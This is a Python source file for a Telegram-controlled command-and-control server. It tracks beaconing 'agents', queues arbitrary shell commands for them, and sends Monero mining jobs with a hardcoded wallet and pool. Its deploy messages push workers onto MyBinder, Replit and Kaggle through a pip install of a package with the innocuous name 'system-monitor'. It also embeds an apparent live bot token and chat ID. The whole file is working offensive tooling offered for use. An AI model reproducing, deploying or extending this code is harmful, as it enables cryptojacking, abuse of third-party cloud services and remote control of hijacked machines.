#!/usr/bin/env python3
"""
Telegram C2 Control Center - Full Integration
Central command hub for all C2 operations:
- Agent management
- Worker/miner deployment
- Task distribution
- System monitoring
"""

import os
import sys
import json
import time
import re
import sqlite3
import threading
import requests
import subprocess
from datetime import datetime
from pathlib import Path

# Configuration
BOT_TOKEN = os.environ.get("TG_BOT_TOKEN", "8620456014:AAEHydgu-9ljKYXvqqY_yApEn6FWEVH91gc")
CHAT_ID = os.environ.get("TG_CHAT_ID", "5804150664")
API_BASE = f"https://api.telegram.org/bot{BOT_TOKEN}"
POLL_INTERVAL = 3

# Database path
BASE_DIR = Path(__file__).resolve().parent.parent
DB_PATH = BASE_DIR / "data" / "c2.db"

# Mining config
MINING_WALLET = "44haKQM5F43d37q3k6mV45YbrL5g6wGHWNB5uyt2cDfTdR8d9FicJCbitjm1xeKZzEVULG7MqdVFWEa9wKXsNLTpFvzffR5"
MINING_POOL = "xmrpool.eu:3333"

# State
last_update_id = 0
agents = {}
pending_tasks = {}  # agent_id -> list of tasks

def get_db():
    """Get database connection."""
    conn = sqlite3.connect(str(DB_PATH))
    conn.row_factory = sqlite3.Row
    return conn

def save_agent_to_db(agent_id, hostname, platform, username="agent", os_type="linux", arch="x64"):
    """Save or update agent in C2 database."""
    try:
        conn = get_db()
        db = conn.cursor()
        
        db.execute("SELECT id FROM agents WHERE id=?", (agent_id,))
        existing = db.fetchone()
        
        if existing:
            db.execute("""
                UPDATE agents 
                SET last_seen=datetime('now'), is_alive=1, hostname=?, platform_type=?
                WHERE id=?
            """, (hostname, platform, agent_id))
            print(f"[TG-DB] Updated agent {agent_id[:8]}")
        else:
            db.execute("""
                INSERT INTO agents (id, hostname, username, os, arch, ip_external, platform_type, is_alive)
                VALUES (?, ?, ?, ?, ?, ?, ?, 1)
            """, (agent_id, hostname, username, os_type, arch, "telegram", platform))
            print(f"[TG-DB] Inserted agent {agent_id[:8]}")
        
        conn.commit()
        conn.close()
        return True
    except Exception as e:
        print(f"[TG-DB-ERROR] {e}")
        return False

def get_agents_from_db():
    """Get all agents from database."""
    try:
        conn = get_db()
        db = conn.cursor()
        db.execute("SELECT * FROM agents WHERE is_alive=1 ORDER BY last_seen DESC")
        rows = db.fetchall()
        conn.close()
        return [dict(row) for row in rows]
    except Exception as e:
        print(f"[TG-DB-ERROR] {e}")
        return []

def add_task_to_db(agent_id, task_type, command):
    """Add task to database."""
    try:
        conn = get_db()
        db = conn.cursor()
        db.execute("""
            INSERT INTO tasks (id, agent_id, task_type, payload, status, created_at)
            VALUES ((SELECT COALESCE(MAX(id),0)+1 FROM tasks), ?, ?, ?, 'pending', datetime('now'))
        """, (agent_id, task_type, command))
        conn.commit()
        task_id = db.lastrowid
        conn.close()
        return task_id
    except Exception as e:
        print(f"[TG-DB-ERROR] {e}")
        return None

def send_message(text, chat_id=None, parse_mode="HTML"):
    """Send message via Telegram API."""
    url = f"{API_BASE}/sendMessage"
    data = {
        "chat_id": chat_id or CHAT_ID,
        "text": text[:4000],
        "parse_mode": parse_mode
    }
    try:
        resp = requests.post(url, json=data, timeout=10)
        return resp.json()
    except Exception as e:
        print(f"[TG-ERROR] Send failed: {e}")
        return {"ok": False, "error": str(e)}

def get_updates(offset=0, timeout=30):
    """Get updates from Telegram."""
    url = f"{API_BASE}/getUpdates"
    params = {"timeout": timeout, "offset": offset}
    try:
        resp = requests.get(url, params=params, timeout=timeout+5)
        return resp.json()
    except Exception as e:
        print(f"[TG-ERROR] Get updates failed: {e}")
        return {"ok": False, "result": []}

def handle_command(message):
    """Handle bot commands - Full C2 Control Center."""
    text = message.get("text", "")
    chat_id = message["chat"]["id"]
    user = message["from"].get("first_name", "User")
    
    print(f"[TG-CMD] {user}: {text[:50]}")
    
    # Check if this is a beacon from agent (not a command)
    if text.startswith("📡") or "Beacon #" in text or "Agent:" in text:
        handle_agent_beacon(message)
        return
    
    # Check for agent registration message
    if "🤖 Agent Online" in text or "ID:" in text:
        handle_agent_message(message)
        return
    
    # Parse command and args
    parts = text.split(maxsplit=2)
    cmd = parts[0].lower() if parts else ""
    arg1 = parts[1] if len(parts) > 1 else ""
    arg2 = parts[2] if len(parts) > 2 else ""
    
    if cmd == "/start":
        send_message(f"""🤖 <b>C2 Control Center</b>

Welcome, {user}!

<b>Agent Commands:</b>
/agents - List all agents
/status - Server status
/stats - Mining statistics

<b>Control Commands:</b>
/deploy [platform] - Deploy new worker
/mine [agent_id] - Start mining on agent
/stop [agent_id] - Stop agent
/cmd [agent_id] [command] - Execute command

<b>Platforms:</b>
• mybinder - Jupyter notebooks
• replit - Replit containers
• kaggle - Kaggle kernels

<b>Quick Start:</b>
<code>pip install git+https://github.com/GaredBerns/system-monitor.git && startcon</code>
""", chat_id)
    
    elif cmd == "/status":
        agents_list = get_agents_from_db()
        alive_count = len([a for a in agents_list if a.get('is_alive')])
        
        send_message(f"""📊 <b>C2 Status</b>

Server: <code>Running</code>
Agents: <code>{alive_count} online</code>
Mode: <code>Telegram Direct API</code>
Time: <code>{datetime.now().strftime('%H:%M:%S')}</code>

<b>Resources:</b>
• Database: <code>✓</code>
• Bot: <code>✓</code>
• Mining Pool: <code>{MINING_POOL}</code>
""", chat_id)
    
    elif cmd == "/agents":
        agents_list = get_agents_from_db()
        
        if not agents_list:
            send_message("📭 No agents in database", chat_id)
            return
        
        msg = f"📋 <b>Agents ({len(agents_list)}):</b>\n\n"
        for a in agents_list[:20]:  # Limit to 20
            status = "🟢" if a.get('is_alive') else "🔴"
            msg += f"{status} <code>{a['id'][:8]}</code> {a.get('hostname', '?')[:15]}\n"
            msg += f"   Platform: {a.get('platform_type', '?')}\n"
        
        send_message(msg, chat_id)
    
    elif cmd == "/deploy":
        platform = arg1 or "mybinder"
        
        msg = f"""🚀 <b>Deploy Worker</b>

Platform: <code>{platform}</code>

<b>Install command:</b>
<code>pip install --break-system-packages --force-reinstall --no-cache-dir git+https://github.com/GaredBerns/system-monitor.git && startcon</code>

<b>Deploy URLs:</b>
• MyBinder: https://gke.mybinder.org/v2/gh/GaredBerns/system-monitor/main
• Replit: https://replit.com/@GaredBerns/system-monitor
• Kaggle: https://kaggle.com/code/garedberns/system-monitor

After deployment, agent will auto-connect here.
"""
        send_message(msg, chat_id)
    
    elif cmd == "/mine":
        agent_id = arg1
        
        if not agent_id:
            send_message("⚠️ Usage: /mine [agent_id]\n\nUse /agents to list IDs", chat_id)
            return
        
        # Add mining task
        task_id = add_task_to_db(agent_id, "mine", f"start_mine:{MINING_POOL}:{MINING_WALLET}")
        
        if task_id:
            send_message(f"""⛏️ <b>Mining Task Created</b>

Agent: <code>{agent_id[:8]}</code>
Task ID: {task_id}
Pool: <code>{MINING_POOL}</code>
Wallet: <code>{MINING_WALLET[:20]}...</code>

Task will be executed on next beacon.
""", chat_id)
        else:
            send_message(f"❌ Failed to create task for {agent_id[:8]}", chat_id)
    
    elif cmd == "/stop":
        agent_id = arg1
        
        if not agent_id:
            send_message("⚠️ Usage: /stop [agent_id]", chat_id)
            return
        
        task_id = add_task_to_db(agent_id, "control", "stop")
        send_message(f"🛑 Stop task created for <code>{agent_id[:8]}</code>", chat_id)
    
    elif cmd == "/cmd":
        agent_id = arg1
        command = arg2
        
        if not agent_id or not command:
            send_message("⚠️ Usage: /cmd [agent_id] [command]", chat_id)
            return
        
        task_id = add_task_to_db(agent_id, "exec", command)
        send_message(f"💻 Command queued for <code>{agent_id[:8]}</code>\n<code>{command}</code>", chat_id)
    
    elif cmd == "/stats":
        # Get mining stats from database
        try:
            conn = get_db()
            db = conn.cursor()
            
            # Count total agents
            db.execute("SELECT COUNT(*) FROM agents")
            total = db.fetchone()[0]
            
            # Count alive agents
            db.execute("SELECT COUNT(*) FROM agents WHERE is_alive=1")
            alive = db.fetchone()[0]
            
            # Count tasks
            db.execute("SELECT COUNT(*) FROM tasks WHERE status='completed'")
            completed = db.fetchone()[0]
            
            conn.close()
            
            send_message(f"""📈 <b>C2 Statistics</b>

<b>Agents:</b>
• Total: {total}
• Online: {alive}
• Offline: {total - alive}

<b>Tasks:</b>
• Completed: {completed}

<b>Mining:</b>
• Pool: {MINING_POOL}
• Wallet: XMR
""", chat_id)
        except Exception as e:
            send_message(f"❌ Stats error: {e}", chat_id)
    
    elif cmd == "/help":
        send_message("""📖 <b>C2 Control Center Help</b>

<b>Monitoring:</b>
/start - Start bot
/status - Server status
/agents - List all agents
/stats - Statistics

<b>Deployment:</b>
/deploy [platform] - Deploy worker

<b>Control:</b>
/mine [agent_id] - Start mining
/stop [agent_id] - Stop agent
/cmd [agent_id] [cmd] - Execute command

<b>Agent ID:</b>
Use first 8 characters from /agents list
""", chat_id)
    
    else:
        # Unknown command
        send_message(f"❓ Unknown command: {cmd}\n\nUse /help for commands", chat_id)

def handle_agent_message(message):
    """Handle messages from agents (contains agent data)."""
    text = message.get("text", "")
    chat_id = message["chat"]["id"]
    
    # Parse agent registration message
    # Format: "🤖 Agent Online\nID: xxx\nPlatform: xxx\nHostname: xxx"
    agent_id = None
    hostname = "unknown"
    platform = "unknown"
    
    # Extract agent ID
    id_match = re.search(r'ID[:\s]+([a-f0-9\-]{8,})', text, re.IGNORECASE)
    if id_match:
        agent_id = id_match.group(1)
    
    # Extract hostname
    host_match = re.search(r'Hostname[:\s]+([^\n]+)', text, re.IGNORECASE)
    if host_match:
        hostname = host_match.group(1).strip()
    
    # Extract platform
    plat_match = re.search(r'Platform[:\s]+([^\n]+)', text, re.IGNORECASE)
    if plat_match:
        platform = plat_match.group(1).strip()
    
    # If found agent data, save to database
    if agent_id:
        agents[agent_id] = {
            "chat_id": chat_id,
            "platform": platform,
            "hostname": hostname,
            "last_seen": datetime.now().isoformat()
        }
        
        # Save to C2 database
        save_agent_to_db(agent_id, hostname, platform)
        print(f"[TG-AGENT] Registered: {agent_id[:8]} ({hostname})")
        
        # Notify admin
        send_message(f"🤖 <b>New Agent Online</b>\n\nID: <code>{agent_id[:8]}</code>\nHostname: {hostname}\nPlatform: {platform}", CHAT_ID)
    
    # Forward all agent messages to admin
    if chat_id != int(CHAT_ID):
        send_message(f"📩 Agent message:\n{text[:500]}", CHAT_ID)

def handle_agent_beacon(message):
    """Handle beacon messages from agents - Telegram Bridge.
    
    When agent sends beacon, check DB for pending tasks and reply with commands.
    Agent will poll replies and execute.
    """
    text = message.get("text", "")
    chat_id = message["chat"]["id"]
    
    # Extract agent ID from beacon
    # Format: "📡 Beacon #N\n\nAgent: xxx\nHostname: xxx\nPlatform: xxx"
    agent_id = None
    hostname = "unknown"
    platform = "unknown"
    
    # Extract agent ID (full UUID)
    id_match = re.search(r'Agent[:\s]+([a-f0-9\-]{36})', text, re.IGNORECASE)
    if id_match:
        agent_id = id_match.group(1)
    
    # Extract hostname
    host_match = re.search(r'Hostname[:\s]+([^\n]+)', text, re.IGNORECASE)
    if host_match:
        hostname = host_match.group(1).strip()
    
    # Extract platform
    plat_match = re.search(r'Platform[:\s]+([^\n]+)', text, re.IGNORECASE)
    if plat_match:
        platform = plat_match.group(1).strip()
    
    if agent_id:
        # Update agent in memory
        agents[agent_id] = {
            "chat_id": chat_id,
            "platform": platform,
            "hostname": hostname,
            "last_seen": datetime.now().isoformat()
        }
        
        # Update database
        save_agent_to_db(agent_id, hostname, platform)
        print(f"[TG-BRIDGE] Agent {agent_id[:8]} beacon received")
        
        # Get pending commands for this agent
        try:
            conn = get_db()
            db = conn.cursor()
            
            # Get pending tasks
            db.execute("""
                SELECT id, task_type, payload 
                FROM tasks 
                WHERE agent_id = ? AND status = 'pending'
                ORDER BY created_at ASC
            """, (agent_id,))
            
            tasks = db.fetchall()
            
            if tasks:
                # Send commands as reply (agent will poll this)
                for task in tasks:
                    task_id, task_type, command = task
                    
                    # Send in format agent expects
                    cmd_msg = f"""📋 <b>Task #{task_id}</b>
Type: {task_type}
Command: {command}"""
                    send_message(cmd_msg, CHAT_ID)
                    
                    # Mark as sent
                    db.execute("UPDATE tasks SET status = 'sent' WHERE id = ?", (task_id,))
                
                conn.commit()
                print(f"[TG-BRIDGE] Sent {len(tasks)} tasks to {agent_id[:8]}")
            else:
                # No pending tasks - send ack
                print(f"[TG-BRIDGE] No pending tasks for {agent_id[:8]}")
            
            conn.close()
        except Exception as e:
            print(f"[TG-BRIDGE-ERROR] {e}")

def poll_loop():
    """Main polling loop."""
    global last_update_id
    
    print(f"[TG-START] Bot polling started")
    print(f"[TG-INFO] Token: {BOT_TOKEN[:20]}...")
    print(f"[TG-INFO] Admin chat: {CHAT_ID}")
    
    # Send startup message
    send_message("🚀 <b>C2 Bot Started</b>\n\nServer is online and ready.")
    
    while True:
        try:
            result = get_updates(offset=last_update_id + 1, timeout=POLL_INTERVAL)
            
            if result.get("ok"):
                for update in result.get("result", []):
                    last_update_id = update["update_id"]
                    
                    if "message" in update:
                        msg = update["message"]
                        chat_id = msg["chat"]["id"]
                        
                        # Handle commands from admin
                        if chat_id == int(CHAT_ID):
                            handle_command(msg)
                        else:
                            # Message from agent
                            handle_agent_message(msg)
            
            time.sleep(1)
            
        except KeyboardInterrupt:
            print("\n[TG-STOP] Bot stopped")
            break
        except Exception as e:
            print(f"[TG-ERROR] Poll error: {e}")
            time.sleep(5)

def main():
    """Entry point."""
    print("=" * 60)
    print("Telegram C2 Bot v1.0")
    print("=" * 60)
    
    # Test connection
    try:
        resp = requests.get(f"{API_BASE}/getMe", timeout=10)
        data = resp.json()
        if data.get("ok"):
            bot = data["result"]
            print(f"[TG-OK] Bot: @{bot['username']} ({bot['first_name']})")
        else:
            print(f"[TG-ERROR] Bot check failed: {data}")
            return
    except Exception as e:
        print(f"[TG-ERROR] Connection failed: {e}")
        return
    
    # Start polling
    poll_loop()

if __name__ == "__main__":
    main()
